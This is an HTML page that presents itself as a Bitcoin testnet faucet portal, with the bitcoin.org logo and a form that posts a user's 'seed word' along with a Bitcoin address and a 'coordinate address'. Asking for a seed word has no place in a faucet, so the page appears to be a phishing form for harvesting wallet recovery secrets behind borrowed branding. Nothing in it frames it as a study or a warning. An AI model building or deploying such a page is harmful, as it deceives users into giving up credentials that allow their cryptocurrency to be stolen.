<!DOCTYPE html>
<html>
<head>
    <title>Bitcoin Testnet Faucet Portal</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 777px;
            padding: 20px;
        }
        .logo {
            width: 400px;
            margin: 20px auto;
            display: block;
        }
        form {
            background: rgba(0, 0, 0, 0.2);
            padding: 30px;
            border-radius: 10px;
            width: 100%;
            box-sizing: border-box;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #333;
            color: white;
            box-sizing: border-box;
        }
        button {
            background: #f7931a;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #e78208;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://bitcoin.org/img/icons/logotop.svg" alt="Bitcoin Logo" class="logo">
        <h1>Bitcoin / Coordinate Testnet Portal</h1>
        <form method="POST">
            <div>
                <input type="text" name="user" placeholder="Enter User Seed Word" required>
            </div>
            <div>
                <input type="text" name="address" placeholder="Enter Bitcoin address" required>
            </div>
            <div>
                <input type="text" name="coordinate" placeholder="Enter Coordinate address" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
